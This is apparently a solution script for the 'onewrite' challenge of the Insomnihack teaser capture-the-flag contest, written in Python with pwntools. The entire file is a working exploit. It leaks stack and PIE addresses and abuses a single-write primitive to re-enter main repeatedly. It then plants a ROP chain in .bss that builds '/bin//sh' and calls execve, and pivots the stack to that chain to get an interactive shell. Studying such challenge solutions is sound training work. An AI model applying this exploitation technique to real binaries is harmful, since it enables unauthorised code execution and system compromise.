#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Author = nepire
#
# Distributed under terms of the MIT license.
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
n = process('./onewrite')
#n = remote('onewrite.teaser.insomnihack.ch',1337)
elf = ELF('./onewrite')

def leak_stack():
    n.recvuntil('>')
    n.sendline("1")
    return int(n.recvuntil('\n'),16)

def leak_pie():
    n.recvuntil('>')
    n.sendline('2')
    return int(n.recvuntil('\n'),16)

def write(addr,data):
    n.recvuntil('address :')
    n.send(str(int(addr)))
    n.recvuntil('data : ')
    n.send(data)

def write_bss(idx):
    i = 8*idx
    stack = leak_stack()
    write(bss_addr+i,rop[i:i+8])
    for i in range(2):
        stack = leak_stack()
        log.success(hex(stack))
        ret = stack - 8
        write(ret,p64(main_addr))


stack = leak_stack()
log.success(hex(stack))
ret = stack - 8
write(ret,'\x15')   # 0x7ffff7d52ab2 (do_leak+157) -> 0x7ffff7d52a15 (do_leak)
pie = leak_pie()
codebase = pie - 0x8a15
log.success(hex(codebase))
##### leak stack codebase && edit ret ####
bss_addr = codebase + elf.bss()
main_addr = codebase + 0x8ab8

pb = lambda x : p64(x + codebase)
rop  = pb(0x000000000000d9f2) # pop rsi ; ret
rop += pb(0x00000000002b1120) # @ .data
rop += pb(0x00000000000460ac) # pop rax ; ret
rop += '/bin//sh'
rop += pb(0x0000000000077901) # mov qword ptr [rsi], rax ; ret
rop += pb(0x000000000000d9f2) # pop rsi ; ret
rop += pb(0x00000000002b1128) # @ .data + 8
rop += pb(0x0000000000041360) # xor rax, rax ; ret
rop += pb(0x0000000000077901) # mov qword ptr [rsi], rax ; ret
rop += pb(0x00000000000084fa) # pop rdi ; ret
rop += pb(0x00000000002b1120) # @ .data
rop += pb(0x000000000000d9f2) # pop rsi ; ret
rop += pb(0x00000000002b1128) # @ .data + 8
rop += pb(0x00000000000484c5) # pop rdx ; ret
rop += pb(0x00000000002b1128) # @ .data + 8
rop += pb(0x0000000000041360) # xor rax, rax ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006d940) # add rax, 1 ; ret
rop += pb(0x000000000006e605) # syscall ; ret
gadgetlen = len(rop)/8
############  loading gadget  ##############


#idx0
write(bss_addr,rop[0:8])
for i in range(2):
    stack = leak_stack()
    log.success(hex(stack))
    ret = stack - 8
    write(ret,p64(main_addr))


#idx 1-last
for i in range(1,gadgetlen):
    write_bss(i)
########### write gadget in bss ############

pop_rsp_ret = codebase + 0x946a
stack = leak_stack()
log.success(hex(stack))
write(stack+0x38,p64(pop_rsp_ret))

stack = leak_stack()
log.success(hex(stack))
write(stack+0x20,p64(bss_addr))
########### jmp bss  getshell   #############


n.interactive()
